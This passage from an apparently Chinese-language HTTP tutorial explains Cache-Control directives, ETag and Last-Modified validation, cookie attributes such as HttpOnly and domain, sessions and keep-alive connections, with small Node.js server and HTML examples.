class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>浏览器比之前多了一个请求，即预请求</p><p><img src="image-20210123181435164.png" alt=""></p><p>​<br>​</p><h3 id="2-3-缓存Cache-Control">2.3 缓存Cache-Control</h3><h4 id="2-3-1-可缓存性">2.3.1 可缓存性</h4><ul><li>public：http请求返回的过程中，在Cache-Control中设置了public的值，代表在这个http请求中返回的内容所经过的任何路径（包括中间的一些http的代理服务器以及发出这个请求的客户端浏览器）都可以对返回内容进行缓存的操作</li><li>private：只有发起请求的浏览器才可以进行缓存</li><li>no-cache：不可以直接使用缓存</li></ul><blockquote><p>no-cache可以在本地、proxy服务器进行缓存，但是每次发起请求都要去服务器验证(2.5 资源验证)；如果服务器返回允许使用这部分缓存，才可以使用缓存</p></blockquote><h4 id="2-3-2-到期">2.3.2 到期</h4><ul><li>max-age=<seconds>：设置这个缓存到多少秒过期</seconds></li><li>s-maxage=<seconds>：s-maxage代替max-age，在代理服务器里才会生效，在客户端浏览器不会读取这个属性</seconds></li><li>ma-stale=<seconds>：在max-age过期之后，如果我们返回的资源有这个max-stale的设置，发起请求的一方主动带的一个头，即便max-age过期了，只要在max-stale这个时间内依然可以使用这个过期的缓存，而不需要去原服务器请求（注意：只有在发起端设置才有用）</seconds></li></ul><h4 id="2-3-3-重新验证">2.3.3 重新验证</h4><ul><li>must-revalidate：在max-age过期了，我们必须到原服务端去发送这个请求来重新获取这部分数据，再来验证这部分内容是不是真的过期了，而不能直接使用本地的缓存</li><li>proxy-revalidate：用在缓存服务器的，指在缓存服务器过期之后，必须到原服务端去发送这个请求来重新获取这部分数据，再来验证这部分内容是不是真的过期了，而不能直接使用本地的缓存</li></ul><h4 id="2-3-4-其他">2.3.4 其他</h4><ul><li>no-store：本地和代理服务器都是不可以缓存，每次都要去服务器端拿新的body内容</li><li>no-transform：用在proxy服务器，告诉proxy服务器不可以随意改变返回的内容（例如不能随便压缩返回的图片）</li></ul><blockquote><p>注意：上面这些头只是一个限制性、声明性的作用，它没有任何强制的约束力</p></blockquote><p>示例代码：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/script.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> html <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/script.js'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/javascript'</span><span class="token punctuation">,</span>      <span class="token string">'Cache-Control'</span><span class="token operator">:</span> <span class="token string">'max-age=20'</span> <span class="token comment">// 设置缓存</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'console.log("script loaded")'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8887</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8887'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210124193709754.png" alt=""></p><p><img src="image-20210124191947363.png" alt="从服务器获取script.js"></p><p><img src="image-20210124192758176.png" alt="再次刷新后从缓存读取"></p><p>问题：我们希望服务端更新了内容之后，客户端也能更新而不是读取的客户端的缓存</p><p>解决方法：在打包完成后会在js文件名上根据打包完成的js文件以及其他的静态资源文件的内容加上一段hash码，如果js文件或者静态资源文件内容不变，hash码就不会变。也就是当url没有变就会使用本地的静态资源缓存，如果所有js文件或者静态资源文件内容变化了，那么嵌入到这些资源的url路径的hash码就会发生变化，这样客户端就会发起新的请求。</p><p>​<br>​</p><h3 id="2-4-资源验证">2.4 资源验证</h3><img src="image-20210124195304725.jpg" alt="浏览器资源验证流程" style="zoom:130%;"><p><strong>验证头：</strong></p><ul><li>Last-Modified：上次修改时间，配合If-Modifie-Since或者If-Unmodified-Since使用，比对上次修改时间以验证资源是否需要更新</li></ul><blockquote><p>​请求的资源有Last-Modified，浏览器在下次请求的时候就会带上Last-Modified，服务器就读取Header中If-Modifie-Since的值来对比资源存在的地方，最后来对比上次修改的时间，如果时间是一样的代表资源还没有被重新修改过，服务器就告诉浏览器可以直接使用这个缓存</p></blockquote><ul><li>Etag：数据签名，资源发生了改变它的数据签名就会改变；配合If-Match或者If-Non-Match使用，对比资源的签名判断是否使用缓存</li></ul><p>示例代码</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> html <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/script.js'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> etag <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'if-none-match'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>etag <span class="token operator">===</span> <span class="token string">'777'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">304</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>        <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/javascript'</span><span class="token punctuation">,</span>        <span class="token string">'Cache-Control'</span><span class="token operator">:</span> <span class="token string">'max-age=2000000, no-cache'</span><span class="token punctuation">,</span>        <span class="token string">'Last-Modified'</span><span class="token operator">:</span> <span class="token string">'123'</span><span class="token punctuation">,</span>        <span class="token string">'Etag'</span><span class="token operator">:</span> <span class="token string">'777'</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span>      response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>        <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/javascript'</span><span class="token punctuation">,</span>        <span class="token string">'Cache-Control'</span><span class="token operator">:</span> <span class="token string">'max-age=2000000, no-cache'</span><span class="token punctuation">,</span>        <span class="token string">'Last-Modified'</span><span class="token operator">:</span> <span class="token string">'123'</span><span class="token punctuation">,</span>        <span class="token string">'Etag'</span><span class="token operator">:</span> <span class="token string">'777'</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span>      response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'console.log("script loaded twice")'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8887</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8887'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210124201729755.png" alt="设置资源验证"></p><p><img src="image-20210124202044063.png" alt="返回304"></p><p><img src="image-20210124202633019.png" alt="缓存读取"></p><p>​<br>​</p><h3 id="2-5-Cookie和Session">2.5 Cookie和Session</h3><h4 id="2-5-1-cookie">2.5.1 cookie</h4><ul><li>通过Set-Cookie设置，保存在浏览器中</li><li>下次在同域的请求中自动带上</li><li>键值对，可以设置多个</li></ul><h4 id="2-5-2-cookie属性">2.5.2 cookie属性</h4><ul><li>max-age和expires设置过期时间</li><li>Secure只在https的时候发送</li><li>HttpOnly无法通过document.cookie访问（安全性）</li></ul><p>示例代码：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> html <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span><span class="token punctuation">,</span>      <span class="token string">'Set-Cookie'</span><span class="token operator">:</span> <span class="token string">'id=123'</span>      <span class="token comment">//'Set-Cookie': ['id=123', 'abc=456'] 可以设置多个CooKie</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8887</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8887'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>Content<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开启服务</p><p><img src="image-20210125140602729.png" alt="查看cookie"></p><blockquote><p>如果Cookie没有设置过期时间，在浏览器关闭后就没有了</p></blockquote><p>设置HttpOnly属性</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span><span class="token punctuation">,</span>    <span class="token string">'Set-Cookie'</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'id=123; max-age=2'</span><span class="token punctuation">,</span> <span class="token string">'abc=456;HttpOnly'</span><span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210125141908195.png" alt="abc=456被禁止访问"></p><p>设置domain</p><blockquote><p>​不同域名的cookie是不能共享的，不过我们可以设置domain来实现所有的二级域可以读到一级域的cookie。（有更好的方式)</p></blockquote><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// const host = request.headers.host</span><span class="token keyword">if</span><span class="token punctuation">(</span>host <span class="token operator">===</span> <span class="token string">'test.com'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token punctuation">{</span>     <span class="token string">'Content-type'</span><span class="token operator">:</span><span class="token string">'text/html'</span><span class="token punctuation">,</span>     <span class="token string">'Set-Cookie'</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">'id=123;max-age=2'</span><span class="token punctuation">,</span><span class="token string">'abc=345;domain=test.com'</span><span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：不可以跨域设置domain</p><h4 id="2-5-2-session">2.5.2 session</h4><p>服务器创建session后，会把session的id以cookie的形式回写给客户机，这样，只要客户机的浏览器不关，再去访问服务器时，都会带着session的id号去，服务器发现客户机浏览器带session的id过来了，就会使用内存中与之对应的session为之服务。</p><blockquote><p>Session不等于Cookie</p></blockquote><h4 id="2-5-3-Session和Cookie的主要区别">2.5.3 Session和Cookie的主要区别</h4><ul><li>Cookie是把用户的数据写给用户的浏览器。</li><li>Session技术把用户的数据写到用户独占的session中。</li><li>Session对象由服务器创建，开发人员可以调用request对象的getSession方法得到session对象。</li></ul><p>​<br>​</p><h3 id="2-6-HTTP的长连接">2.6 HTTP的长连接</h3><p>  在HTTP/1.0中<strong>默认使用短连接</strong>。也就是说客户端和服务器每进行一次HTTP操作就建立一次连接，任务结束就中断连接。当客户端浏览器访问的某个HTML或其他类型的Web页中包含有其他的Web资源（如JavaScript文件、图像文件、CSS文件等），每遇到这样一个Web资源，浏览器就会重新建立一个HTTP会话。</p><p>  从HTTP/1.1起，默认使用长连接，用以保持连接特性。使用长连接的HTTP协议，会在响应头加入<code>Connection:keep-alive</code>。在使用长连接的情况下，当一个网页打开完成后，客户端和服务器之间用于传输HTTP数据的TCP连接不会关闭，客户端再次访问这个服务器时，会继续使用这一条已经建立的连接。</p><p>  实现长连接需要客户端和服务端都支持长连接。 HTTP协议的长连接和短连接，实质上是TCP协议的长连接和短连接。</p><ul><li><p>Connection:keep-alive：是可以复用TCP/IP的链接，不用每次发起一个请求就创建一个TCP/IP的链接（只有在同域下，这个TCP/IP的链接才可以复用）</p></li><li><p>Connection:close：每次发起请求就会创建一个TCP/IP链接，没有重复使用TCP/IP链接（每个连接的建立都是需要资源消耗和时间消耗的）</p></li></ul><p>示例代码：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>  <span class="token keyword">const</span> html <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> img <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'test.jpg'</span><span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'image/jpg'</span><span class="token punctuation">,</span>      <span class="token string">'Connection'</span><span class="token operator">:</span> <span class="token string">'keep-alive'</span> <span class="token comment">// or close</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8887</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8887'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/test1.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token 